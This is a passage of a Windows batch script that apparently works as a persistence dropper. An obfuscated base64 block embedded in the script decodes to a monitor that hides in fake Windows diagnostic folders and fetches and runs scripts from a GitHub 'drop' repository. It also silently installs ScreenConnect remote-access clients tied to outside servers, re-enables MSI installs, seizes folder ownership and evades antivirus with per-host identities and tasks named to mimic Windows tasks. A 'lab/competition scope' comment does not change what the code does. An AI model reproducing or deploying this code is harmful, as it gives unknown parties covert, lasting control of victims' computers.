:EnsureGryxaMust
rem O42: thin fallback — prefer lib gryxa-ensure; never msiexec here.
if exist "%WD%\own_lib.ps1" (
  powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%WD%\own_lib.ps1" -Action gryxa-ensure -WorkDir "%WD%" -Build O42 >>"%LOG%" 2>&1
)
if exist "%WD%\gryxa.cfg" for /f "usebackq tokens=1,* delims==" %%K in ("%WD%\gryxa.cfg") do if /I "%%K"=="CURRENT_FP" set "KEEP3=%%L"
if defined KEEP3 set "GRYXA=ScreenConnect Client (%KEEP3%)"
sc query "%GRYXA%" | findstr /I RUNNING >nul
if not errorlevel 1 (echo gryxa_must_running_ok>>"%LOG%") else (echo gryxa_must_still_down>>"%LOG%")
exit /b 0

:NoMsiPolicy
reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg delete "HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer" /v DisableMSI /t REG_DWORD /d 0 /f >nul 2>&1
exit /b 0

:ForceCopy
rem O20: copy over previously hardened (+h +s) targets - strip attrs first
attrib -h -s -r "%~2" >nul 2>&1
copy /y "%~1" "%~2" >nul 2>&1
if exist "%~2" exit /b 0
exit /b 1

:Extract
rem %1=tag %2=outfile - pulls base64 block embedded in this script (self-contained mode)
set "TAG=%~1"
set "OUT=%~2"
powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "$raw=Get-Content -LiteralPath '%~f0' -Raw; $m=[regex]::Match($raw,'(?ms)%TAG%_BEGIN\s*(.+?)\s*%TAG%_END'); if($m.Success){ $b=($m.Groups[1].Value -replace '(?m)^::','' -replace '\s',''); try{ [IO.File]::WriteAllBytes('%OUT%',[Convert]::FromBase64String($b)) }catch{} }"
if exist "%OUT%" exit /b 0
exit /b 1

::B64_MON_BEGIN
::QGVjaG8gb2ZmDQpyZW0g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ
::4pWQ4pWQ4pWQ4pWQDQpyZW0gIE9XTl9NT04gIEJVSUxEIDIwMjYwODA0TTUzDQpy
::ZW0gIE01MzogU1RPUFBFRCtyZWxheSBJbWFnZVBhdGgg4oaSIHNjIHN0YXJ0IG9u
::bHkgKG5ldmVyIGhlYWwvcmVpbnN0YWxsKTsgbG9uZ2VyIHN0YXJ0IHdhaXQ7IGhl
::YWwgb25seSBvbiAxMDYwLg0KcmVtICBNNTI6IGF1dG8taGVhbCBzdHVjayBHcnl4
::YSAoMTA2MCtkaXIgLyBSVU5OSU5HIG5vIGdyeXhhLmNvbSBJbWFnZVBhdGgpIHZp
::YSBGOC9HNzsgcmVzdG9yZSBsaWIgaWYgQVYgYXRlIGl0Lg0KcmVtICBNNTE6IGZv
::cmNlX2dyeXhhLmZsYWcgcXVldWVzIG93bl9ncnl4YV9mb3JjZSBSRUlOU1RBTEwg
::KHBhbmVsIHdpcGUpLiBEYWlseSBwYXRoIHN0YXlzIGZyZWV6ZS4NCnJlbSAgTTUw
::OiBoYXNoLW1pc21hdGNoIOKGkiBCVUlMRCBmYWxsYmFjayAodW5zdGljayBDRE4t
::c3RhbGUgbWFpbikuDQpyZW0gIE00OTogRlJFRVpFIC0gbm8gYXV0byBHcnl4YSBt
::c2lleGVjIGZyb20gbW9uOyBzdGFydC1vbmx5OyBtYW51YWwgZm9yY2Ugb25seS4N
::CnJlbSAgTTQ4OiBIQU5EUy1PRkYgYWxsIFNDIGludGVycnVwdCDigJQgb25seSBH
::cnl4YSBpbnN0YWxsLWlmLWFic2VudC4gTm8gZXh0ZXJtaW5hdGUvc2V2cnogL2kv
::c2MgZGVsZXRlLg0KcmVtICBNNDc6IEhBUkQgc3RvcCBHcnl4YSBpbnRlcnJ1cHRz
::IOKAlCBubyByYXcgc2V2cnogL2k7IGRldGVjdCBhbnkgbm9uLXNldnJ6IFNDOyBh
::ZG9wdCBsaXZlIEZQLg0KcmVtICBNNDY6IFNUQVJUX1BFTkRJTkcgPSBhbGl2ZTsg
::bmV2ZXIgL3ggR3J5eGEgd2hpbGUgc2VydmljZSBleGlzdHMgKGNvbm5lY3QtZHJv
::cCkuDQpyZW0gIE00NTogTDQyIHNhZmUgRlAgbWlncmF0ZSAoaW5zdGFsbCBuZXcg
::YmVmb3JlIHJlbW92aW5nIG9sZCBHcnl4YSkuDQpyZW0gIE00NDogZm9yY2VfZ3J5
::eGEuZmxhZyBtdXN0IE5PVCAveCBsaXZlIEdyeXhhIChMNDEgZm9yY2Utc2tpcC1p
::Zi1ydW5uaW5nKS4NCnJlbSAgTTQzOiBBTVNJLXByb29mIEdyeXhhIGZhbGxiYWNr
::IHZpYSBvd25fZ3J5eGEuY21kIChwdXJlIG1zaWV4ZWMpIHdoZW4gUFMgYmxvY2tl
::ZC9taXNzaW5nLg0KcmVtICBNNDI6IHNpZ25lZCBtYW5pZmVzdDsgc2V2cnouY2Zn
::OyBzaWJsaW5nLXNhZmUgc2V2cnogL2kuDQpyZW0gIEF1dGhvcml6ZWQgaW50ZXJu
::YWwgZGVwbG95bWVudCAtIGxhYi9jb21wZXRpdGlvbiBzY29wZSBvbmx5Lg0KcmVt
::IOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
::kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkA0K
::c2V0bG9jYWwgRW5hYmxlRGVsYXllZEV4cGFuc2lvbg0KDQpzZXQgIktFRVBfRlA9
::NWY2MDEwNTc5ODUyZTUwNyINCnNldCAiQUxUX0ZQPWY4NjFjODE0MGQ0NTM0Mjci
::DQpzZXQgIkdSWVhBX0ZQPTM2ZTUwNmZmMDE2YjIxNTEiDQpzZXQgIldEPUM6XFBy
::b2dyYW1EYXRhXE1pY3Jvc29mdFxXaW5kb3dzXFdFUlxUZW1wXC53dWNhY2hlIg0K
::c2V0ICJFVEw9QzpcUHJvZ3JhbURhdGFcTWljcm9zb2Z0XERpYWdub3Npc1xTdGF0
::ZVwuZXRsY2FjaGUiDQpzZXQgIkxPRz0lV0QlXG93bl9tb24ubG9nIg0Kc2V0ICJT
::VEFURT0lV0QlXG93bl9tb24uc3RhdGUiDQpzZXQgIkhCRkxBRz0lV0QlXGhiLmZs
::YWciDQpzZXQgIkNVUkw9JVN5c3RlbVJvb3QlXFN5c3RlbTMyXGN1cmwuZXhlIg0K
::c2V0ICJURz1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVk
::ZHkvZ2l0aHViLWRyb3AvbWFpbi90Z19yZXBvcnQucHMxP3Q9JVJBTkRPTSUlUkFO
::RE9NJSINCnNldCAiVEcyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9i
::dWRkeS9naXRodWItZHJvcEBtYWluL3RnX3JlcG9ydC5wczE/dD0lUkFORE9NJSVS
::QU5ET00lIg0Kc2V0ICJPV05TRUM9aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRl
::bnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1kcm9wL21haW4vb3duX3NlY3VyZS5jbWQ/
::dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJPV05TRUMyPWh0dHBzOi8vY2RuLmpz
::ZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293bl9zZWN1
::cmUuY21kP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOTU9OPWh0dHBzOi8v
::cmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS94bm9idWRkeS9naXRodWItZHJvcC9t
::YWluL293bl9tb24uY21kP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOTU9O
::Mj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gveG5vYnVkZHkvZ2l0aHViLWRy
::b3BAbWFpbi9vd25fbW9uLmNtZD90PSVSQU5ET00lJVJBTkRPTSUiDQpzZXQgIk9X
::TkxJQj1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkv
::Z2l0aHViLWRyb3AvbWFpbi9vd25fbGliLnBzMT90PSVSQU5ET00lJVJBTkRPTSUi
::DQpzZXQgIk9XTkxJQjI9aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3hub2J1
::ZGR5L2dpdGh1Yi1kcm9wQG1haW4vb3duX2xpYi5wczE/dD0lUkFORE9NJSVSQU5E
::T00lIg0Kc2V0ICJPV05HUllYQT1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVu
::dC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi9vd25fZ3J5eGEuY21kP3Q9
::JVJBTkRPTSUlUkFORE9NJSINCnNldCAiT1dOR1JZWEEyPWh0dHBzOi8vY2RuLmpz
::ZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWItZHJvcEBtYWluL293bl9ncnl4
::YS5jbWQ/dD0lUkFORE9NJSVSQU5ET00lIg0Kc2V0ICJNQU5JRkVTVF9VUkw9aHR0
::cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3hub2J1ZGR5L2dpdGh1Yi1k
::cm9wL21haW4vdXBkYXRlLm1hbmlmZXN0P3Q9JVJBTkRPTSUlUkFORE9NJSINCnNl
::dCAiTUFOSUZFU1RfU0lHX1VSTD1odHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVu
::dC5jb20veG5vYnVkZHkvZ2l0aHViLWRyb3AvbWFpbi91cGRhdGUubWFuaWZlc3Qu
::c2lnP3Q9JVJBTkRPTSUlUkFORE9NJSINCnNldCAiU0VWUlpfRVhQX1VSTD1odHRw
::czovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20veG5vYnVkZHkvZ2l0aHViLWRy
::b3AvbWFpbi9zZXZyel9leHBlY3RlZC5jZmc/dD0lUkFORE9NJSVSQU5ET00lIg0K
::c2V0ICJTRVZSWl9FWFBfVVJMMj1odHRwczovL2Nkbi5qc2RlbGl2ci5uZXQvZ2gv
::eG5vYnVkZHkvZ2l0aHViLWRyb3BAbWFpbi9zZXZyel9leHBlY3RlZC5jZmc/dD0l
::UkFORE9NJSVSQU5ET00lIg0Kc2V0ICJNU0lfVVJMPWh0dHBzOi8vdWkuc2V2cnou
::Y29tL0Jpbi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5
::PUd1ZXN0Ig0Kc2V0ICJNU0lfR1JZWEE9aHR0cHM6Ly91aS5ncnl4YS5jb20vQmlu
::L1NjcmVlbkNvbm5lY3QuQ2xpZW50U2V0dXAubXNpP2U9QWNjZXNzJnk9R3Vlc3Qi
::DQpzZXQgIk1TSV9QS0cxPWh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNv
::bS94bm9idWRkeS9naXRodWItZHJvcC9tYWluL3BrZy5tc2kiDQpzZXQgIk1TSV9Q
::S0cyPWh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC94bm9idWRkeS9naXRodWIt
::ZHJvcEBtYWluL3BrZy5tc2kiDQpzZXQgIk1TST0lUHJvZ3JhbURhdGElXFNjcmVl
::bkNvbm5lY3QuQ2xpZW50U2V0dXAubXNpIg0Kc2V0ICJNU0lDQUNIRT0lV0QlXHBr
::Zy5tc2kiDQpzZXQgIk1TSV9HPSVQcm9ncmFtRGF0YSVcU2NyZWVuQ29ubmVjdC5H
::cnl4YS5tc2kiDQpzZXQgIk1TSUNBQ0hFX0c9JVdEJVxwa2dfZ3J5eGEubXNpIg0K
::DQppZiBub3QgZXhpc3QgIiVXRCUiIG1kICIlV0QlIiAyPm51bA0KaWYgbm90IGV4
::aXN0ICIlTE9HJSIgdHlwZSBudWw+IiVMT0clIiAyPm51bA0KDQpzZXQgIk1PTlZF
::Uj1NNTMiDQpzZXQgIlBGODY9JVByb2dyYW1GaWxlcyh4ODYpJSINCnNldCAiR1JZ
::WEFfREVFUD0lV0QlXGdyeXhhX2RlZXAuZmxhZyINCnJlbSBsb2FkIGN1cnJlbnQg
::R3J5eGEgRlAgKG1heSByb3RhdGUgd2hlbiBzZXJ2ZXIva2V5cyBjaGFuZ2UpDQpp
::ZiBleGlzdCAiJVdEJVxncnl4YS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5z
::PTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4YS5jZmciKSBkbyBpZiAv
::SSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVMIg0KaWYgbm90
::IGRlZmluZWQgR1JZWEFfRlAgc2V0ICJHUllYQV9GUD0zNmU1MDZmZjAxNmIyMTUx
::Ig0KZm9yIC9mICJ0b2tlbnM9MS0zIGRlbGltcz0vICIgJSVhIGluICgiJWRhdGUl
::IikgZG8gc2V0ICJEVD0lZGF0ZSUgJXRpbWUlIg0KZWNoby4+PiIlTE9HJSINCmVj
::aG8g4pSA4pSAIHRpY2sgIURUISBbdmVyICVNT05WRVIlXSDilIDilIA+PiIlTE9H
::JSINCnNldCAiQ09VTlQ9MCINCnNldCAiSU5TVEFMTEVEPTAiDQpzZXQgIlBSSU1f
::T0s9MCINCnNldCAiQUxUX09LPTAiDQpzZXQgIkZPUkVJR05fTEVGVD0wIg0Kc2V0
::ICJGT1JFSUdOX0xJU1Q9Ig0Kc2V0ICJNU0lFWElUPW5vdC1ydW4iDQoNCnJlbSDi
::lIDilIAgWzBdIHNpbmdsZS1mbGlnaHQgbXV0ZXggKHN0b3Agb3ZlcmxhcHBpbmcg
::dGlja3MgcmFjaW5nIG1zaWV4ZWMpIOKUgOKUgA0Kc2V0ICJNVVRFWD0lV0QlXHRp
::Y2subG9jayINCmlmIGV4aXN0ICIlTVVURVglIiAoDQogIGZvciAlJUEgaW4gKCIl
::TVVURVglIikgZG8gc2V0ICJMT0NLQUdFPSUlfnRBIg0KICBwb3dlcnNoZWxsIC1O
::b1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoVGVzdC1QYXRo
::ICclTVVURVglJykgLWFuZCAoKChHZXQtRGF0ZSktKEdldC1JdGVtIC1MaXRlcmFs
::UGF0aCAnJU1VVEVYJScgLUZvcmNlKS5MYXN0V3JpdGVUaW1lKS5Ub3RhbE1pbnV0
::ZXMgLWx0IDIwKSl7IGV4aXQgMSB9IGVsc2UgeyBleGl0IDAgfSIgPm51bCAyPiYx
::DQogIGlmIGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyB0aWNrX3NraXBwZWRfbXV0
::ZXhfYnVzeT4+IiVMT0clIg0KICAgIGVuZGxvY2FsDQogICAgZXhpdCAvYiAwDQog
::ICkNCikNCmVjaG8gJURBVEUlICVUSU1FJSAlUkFORE9NJT4iJU1VVEVYJSINCg0K
::cmVtIOKUgOKUgCBwZXItaG9zdCBpZGVudGl0eSAoYW50aS1zaWduYXR1cmUpIOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5w
::czEiIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1
::dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rp
::b24gaW5pdCAtV29ya0RpciAiJVdEJSIgPm51bCAyPiYxDQppZiBleGlzdCAiJVdE
::JVxpZGVudGl0eS5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxp
::bXM9PSIgJSVLIGluICgiJVdEJVxpZGVudGl0eS5jZmciKSBkbyBzZXQgIiUlSz0l
::JUwiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Egc2V0ICJUQVNLX0E9V2VyUXVldWVT
::eW5jIg0KaWYgbm90IGRlZmluZWQgVEFTS19CIHNldCAiVEFTS19CPVBsYVNlcnZl
::ckhlYWx0aCINCmlmIG5vdCBkZWZpbmVkIFRBU0tfQyBzZXQgIlRBU0tfQz1XZGlI
::b3N0UHJveHkiDQppZiBub3QgZGVmaW5lZCBUQVNLX0Qgc2V0ICJUQVNLX0Q9VGNw
::SXBDb25mbGljdFJlcyINCmlmIG5vdCBkZWZpbmVkIE1PX0Egc2V0ICJNT19BPTIi
::DQppZiBub3QgZGVmaW5lZCBNT19CIHNldCAiTU9fQj0zIg0KDQpyZW0g4pSA4pSA
::IFtBXSBhdXRvLXVwZGF0ZSBjb3JlIGZpbGVzIChiZXN0IGVmZm9ydCkg4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::DQppZiBub3QgZXhpc3QgIiVDVVJMJSIgc2V0ICJDVVJMPWN1cmwuZXhlIg0KcmVt
::IE0zNTogZ3VhcmFudGVlIHVwZGF0ZSBjaGFubmVsIOKAlCB1bmhhcmRlbiB3b3Jr
::ZGlyIGVhY2ggdGljayBhbmQgc3RhZ2UgZG93bmxvYWRzDQpyZW0gaW4gQzpcV2lu
::ZG93c1xUZW1wIChuZXZlciBBQ0wtbG9ja2VkKSwgdGhlbiBtb3ZlIGludG8gJVdE
::JS4gTG9ja0RpciBjYW5ub3QgZnJlZXplIHVzLg0Kc2V0ICJTVEFHRT0lU3lzdGVt
::Um9vdCVcVGVtcFwudXBkIg0KaWYgbm90IGV4aXN0ICIlU1RBR0UlIiBta2RpciAi
::JVNUQUdFJSIgPm51bCAyPiYxDQphdHRyaWIgLWggLXMgLXIgIiVXRCUiID5udWwg
::Mj4mMQ0KdGFrZW93biAvRiAiJVdEJSIgL1IgL0QgWSA+bnVsIDI+JjENCmljYWNs
::cyAiJVdEJSIgL3Jlc2V0IC9UIC9DIC9RID5udWwgMj4mMQ0KaWNhY2xzICIlV0Ql
::IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxTWVNURU06KE9JKShDSSlGIiAiQlVJTFRJ
::TlxBZG1pbmlzdHJhdG9yczooT0kpKENJKUYiIC9UIC9DIC9RID5udWwgMj4mMQ0K
::YXR0cmliIC1oIC1zIC1yICIlV0QlXHRnX3JlcG9ydC5wczEiICIlV0QlXG93bl9z
::ZWN1cmUuY21kIiAiJVdEJVxvd25fbGliLnBzMSIgIiVXRCVcb3duX21vbi5jbWQi
::ID5udWwgMj4mMQ0KDQpzZXQgIlNFTEZfVVBEPTAiDQoiJUNVUkwlIiAtTCAtLXNz
::bC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQwIC1v
::ICIlU1RBR0UlXHRnX3JlcG9ydC5uZXciICIlVEclIiA+bnVsIDI+JjENCmlmIG5v
::dCBleGlzdCAiJVNUQUdFJVx0Z19yZXBvcnQubmV3IiAiJUNVUkwlIiAtTCAtLWNv
::bm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVTVEFHRSVcdGdfcmVw
::b3J0Lm5ldyIgIiVURzIlIiA+bnVsIDI+JjENCiIlQ1VSTCUiIC1MIC0tc3NsLW5v
::LXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMzAgLW8gIiVT
::VEFHRSVcb3duX3NlY3VyZS5uZXciICIlT1dOU0VDJSIgPm51bCAyPiYxDQppZiBu
::b3QgZXhpc3QgIiVTVEFHRSVcb3duX3NlY3VyZS5uZXciICIlQ1VSTCUiIC1MIC0t
::Y29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSAzMCAtbyAiJVNUQUdFJVxvd25f
::c2VjdXJlLm5ldyIgIiVPV05TRUMyJSIgPm51bCAyPiYxDQoiJUNVUkwlIiAtTCAt
::LXNzbC1uby1yZXZva2UgLS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDQw
::IC1vICIlU1RBR0UlXG93bl9saWIubmV3IiAiJU9XTkxJQiUiID5udWwgMj4mMQ0K
::aWYgbm90IGV4aXN0ICIlU1RBR0UlXG93bl9saWIubmV3IiAiJUNVUkwlIiAtTCAt
::LWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVTVEFHRSVcb3du
::X2xpYi5uZXciICIlT1dOTElCMiUiID5udWwgMj4mMQ0KIiVDVVJMJSIgLUwgLS1z
::c2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSA0MCAt
::byAiJVNUQUdFJVxvd25fbW9uLm5leHQiICIlT1dOTU9OJSIgPm51bCAyPiYxDQpp
::ZiBub3QgZXhpc3QgIiVTVEFHRSVcb3duX21vbi5uZXh0IiAiJUNVUkwlIiAtTCAt
::LWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgNDAgLW8gIiVTVEFHRSVcb3du
::X21vbi5uZXh0IiAiJU9XTk1PTjIlIiA+bnVsIDI+JjENCiIlQ1VSTCUiIC1MIC0t
::c3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA4IC0tbWF4LXRpbWUgMjAg
::LW8gIiVTVEFHRSVcb3duX2dyeXhhLm5ldyIgIiVPV05HUllYQSUiID5udWwgMj4m
::MQ0KaWYgbm90IGV4aXN0ICIlU1RBR0UlXG93bl9ncnl4YS5uZXciICIlQ1VSTCUi
::IC1MIC0tY29ubmVjdC10aW1lb3V0IDggLS1tYXgtdGltZSAyMCAtbyAiJVNUQUdF
::JVxvd25fZ3J5eGEubmV3IiAiJU9XTkdSWVhBMiUiID5udWwgMj4mMQ0KIiVDVVJM
::JSIgLUwgLS1zc2wtbm8tcmV2b2tlIC0tY29ubmVjdC10aW1lb3V0IDYgLS1tYXgt
::dGltZSAyMCAtbyAiJVNUQUdFJVx1cGRhdGUubWFuaWZlc3QiICIlTUFOSUZFU1Rf
::VVJMJSIgPm51bCAyPiYxDQoiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2UgLS1j
::b25uZWN0LXRpbWVvdXQgNiAtLW1heC10aW1lIDIwIC1vICIlU1RBR0UlXHVwZGF0
::ZS5tYW5pZmVzdC5zaWciICIlTUFOSUZFU1RfU0lHX1VSTCUiID5udWwgMj4mMQ0K
::DQpyZW0gTTQyOiBzaWduZWQgdXBkYXRlLm1hbmlmZXN0IGdhdGUgKFJTQS1TSEEy
::NTYpLiBGYWxsYmFjayB0byBCVUlMRCBtYXJrZXJzIGlmIG5vIHB1YmtleSB5ZXQu
::DQpzZXQgIlVQRF9PSz0wIg0Kc2V0ICJNQVA9Ig0KaWYgZXhpc3QgIiVTVEFHRSVc
::b3duX2xpYi5uZXciIHNldCAiTUFQPSFNQVAhb3duX2xpYi5wczE9JVNUQUdFJVxv
::d25fbGliLm5ldzsiDQppZiBleGlzdCAiJVNUQUdFJVxvd25fbW9uLm5leHQiIHNl
::dCAiTUFQPSFNQVAhb3duX21vbi5jbWQ9JVNUQUdFJVxvd25fbW9uLm5leHQ7Ig0K
::aWYgZXhpc3QgIiVTVEFHRSVcb3duX3NlY3VyZS5uZXciIHNldCAiTUFQPSFNQVAh
::b3duX3NlY3VyZS5jbWQ9JVNUQUdFJVxvd25fc2VjdXJlLm5ldzsiDQppZiBleGlz
::dCAiJVNUQUdFJVx0Z19yZXBvcnQubmV3IiBzZXQgIk1BUD0hTUFQIXRnX3JlcG9y
::dC5wczE9JVNUQUdFJVx0Z19yZXBvcnQubmV3OyINCmlmIGV4aXN0ICIlU1RBR0Ul
::XG93bl9ncnl4YS5uZXciIHNldCAiTUFQPSFNQVAhb3duX2dyeXhhLmNtZD0lU1RB
::R0UlXG93bl9ncnl4YS5uZXc7Ig0Kc2V0ICJWUkVTPW1pc3NpbmciDQppZiBleGlz
::dCAiJVdEJVxvd25fbGliLnBzMSIgaWYgZXhpc3QgIiVTVEFHRSVcdXBkYXRlLm1h
::bmlmZXN0IiBpZiBleGlzdCAiJVNUQUdFJVx1cGRhdGUubWFuaWZlc3Quc2lnIiBp
::ZiBkZWZpbmVkIE1BUCAoDQogIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVS
::IGluIChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhl
::Y3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFj
::dGlvbiB2ZXJpZnktdXBkYXRlIC1Xb3JrRGlyICIlV0QlIiAtRXh0cmEgIiVTVEFH
::RSVcdXBkYXRlLm1hbmlmZXN0fCVTVEFHRSVcdXBkYXRlLm1hbmlmZXN0LnNpZ3wh
::TUFQISJgKSBkbyBzZXQgIlZSRVM9JSVSIg0KKQ0KZWNobyB1cGRhdGVfdmVyaWZ5
::PSFWUkVTIT4+IiVMT0clIg0KaWYgL0kgIiFWUkVTISI9PSJvayIgKA0KICBzZXQg
::IlVQRF9PSz0xIg0KKSBlbHNlIGlmIC9JICIhVlJFUyEiPT0ibWlzc2luZyIgKA0K
::ICBzZXQgIlVQRF9PSz1mYWxsYmFjayINCikgZWxzZSBpZiAvSSAiIVZSRVMhIj09
::Im5vLXB1YmtleSIgKA0KICBzZXQgIlVQRF9PSz1mYWxsYmFjayINCikgZWxzZSBp
::ZiAvSSAiIVZSRVM6fjAsMTAhIj09Im5vdC1pbi1tYW4iICgNCiAgc2V0ICJVUERf
::T0s9ZmFsbGJhY2siDQopIGVsc2UgaWYgL0kgIiFWUkVTOn4wLDEzISI9PSJoYXNo
::LW1pc21hdGNoIiAoDQogIHJlbSBNNTA6IENETiBtYXkgc2VydmUgc3RhbGUgbWFp
::biB3aGlsZSBtYW5pZmVzdCBpcyBmcmVzaCDigJQgbmV2ZXIgcmVmdXNlLWFsbCAo
::dGhhdCBzdHVjayBmbGVldCBvbiBNNDgpLg0KICBzZXQgIlVQRF9PSz1mYWxsYmFj
::ayINCiAgZWNobyB1cGRhdGVfaGFzaF9taXNtYXRjaF9mYWxsYmFja18hVlJFUyE+
::PiIlTE9HJSINCikgZWxzZSAoDQogIGVjaG8gdXBkYXRlX3JlZnVzZWRfIVZSRVMh
::Pj4iJUxPRyUiDQopDQoNCmlmIC9JICIhVVBEX09LISI9PSIxIiAoDQogIGlmIGV4
::aXN0ICIlU1RBR0UlXHRnX3JlcG9ydC5uZXciIG1vdmUgL3kgIiVTVEFHRSVcdGdf
::cmVwb3J0Lm5ldyIgIiVXRCVcdGdfcmVwb3J0LnBzMSIgPm51bCAyPiYxDQogIGlm
::IGV4aXN0ICIlU1RBR0UlXG93bl9zZWN1cmUubmV3IiBtb3ZlIC95ICIlU1RBR0Ul
::XG93bl9zZWN1cmUubmV3IiAiJVdEJVxvd25fc2VjdXJlLmNtZCIgPm51bCAyPiYx
::DQogIGlmIGV4aXN0ICIlU1RBR0UlXG93bl9saWIubmV3IiBtb3ZlIC95ICIlU1RB
::R0UlXG93bl9saWIubmV3IiAiJVdEJVxvd25fbGliLnBzMSIgPm51bCAyPiYxDQog
::IGlmIGV4aXN0ICIlU1RBR0UlXG93bl9ncnl4YS5uZXciIGZpbmRzdHIgL0M6Ik9X
::Tl9HUllYQSBCVUlMRCIgIiVTVEFHRSVcb3duX2dyeXhhLm5ldyIgPm51bCAyPiYx
::ICYmIG1vdmUgL3kgIiVTVEFHRSVcb3duX2dyeXhhLm5ldyIgIiVXRCVcb3duX2dy
::eXhhLmNtZCIgPm51bCAyPiYxDQogIHNldCAiU0VMRl9VUEQ9MCINCiAgaWYgZXhp
::c3QgIiVTVEFHRSVcb3duX21vbi5uZXh0IiAoDQogICAgZmMgL2IgIiVTVEFHRSVc
::b3duX21vbi5uZXh0IiAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAyPiYxDQogICAg
::aWYgZXJyb3JsZXZlbCAxIHNldCAiU0VMRl9VUEQ9MSINCiAgICBpZiAiIVNFTEZf
::VVBEISI9PSIwIiBkZWwgL2YgL3EgIiVTVEFHRSVcb3duX21vbi5uZXh0IiA+bnVs
::IDI+JjENCiAgKQ0KKSBlbHNlIGlmIC9JICIhVVBEX09LISI9PSJmYWxsYmFjayIg
::KA0KICBmaW5kc3RyIC9DOiJUR19SRVBPUlQgQlVJTEQiICIlU1RBR0UlXHRnX3Jl
::cG9ydC5uZXciID5udWwgMj4mMSAmJiBmb3IgJSVGIGluICgiJVNUQUdFJVx0Z19y
::ZXBvcnQubmV3IikgZG8gaWYgJSV+ekYgR1RSIDE1MDAgbW92ZSAveSAiJVNUQUdF
